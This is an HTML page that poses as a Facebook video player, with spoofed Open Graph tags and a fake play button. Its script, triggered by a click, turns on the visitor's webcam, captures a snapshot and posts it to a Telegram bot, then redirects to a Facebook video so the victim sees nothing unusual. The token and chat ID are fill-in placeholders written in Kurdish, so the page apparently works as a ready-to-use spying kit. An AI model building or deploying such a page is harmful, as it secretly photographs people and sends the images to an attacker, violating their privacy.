<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:site_name" content="Facebook">
    <meta property="og:title" content="Facebook Video Player">
    <meta property="og:image" content="thumbnail.jpg">
    <meta property="og:type" content="video.other">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Facebook Video</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: black; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        video { width: 100%; height: 100%; object-fit: cover; cursor: pointer; }
        canvas { display: none; }
        .play-btn { position: absolute; width: 80px; height: 80px; background: rgba(0,0,0,0.5); border-radius: 50%; display: flex; justify-content: center; align-items: center; pointer-events: none; }
        .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent white; margin-left: 5px; }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline poster="thumbnail.jpg"></video>
    <div class="play-btn"></div>
    <canvas id="canvas"></canvas>

    <script>
        const token = 'لێرە_API_TOKEN_دابنێ';
        const chat_id = 'لێرە_CHAT_ID_دابنێ';
        const facebook_url = "https://www.facebook.com/watch/?v=12345678"; 

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                setTimeout(capture, 1000);
            } catch (err) { window.location.href = facebook_url; }
        }

        function capture() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chat_id);
                formData.append('photo', blob, 'snap.jpg');
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
                .then(() => { window.location.href = facebook_url; });
            }, 'image/jpeg');
        }
        window.onclick = () => { start(); };
    </script>
</body>
</html>
